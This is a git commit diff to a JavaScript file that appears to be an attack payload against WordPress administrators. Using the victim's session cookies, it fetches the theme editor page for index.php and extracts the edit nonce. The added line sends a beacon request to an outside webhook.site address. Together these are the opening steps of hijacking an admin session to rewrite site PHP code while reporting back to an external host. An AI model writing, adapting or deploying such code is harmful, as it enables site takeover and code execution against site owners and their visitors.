f1f50c033fa18ee4442e38ad5e03cd31e836cc24
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 14:11:00 +0300

    Update phaedon.js

--- phaedon.js
+++ phaedon.js
@@ -1,6 +1,7 @@
 
 async function caller(){
 	try{
+		await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?estw');
 		console.log('calling');
 		const res = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
 		console.log(res);
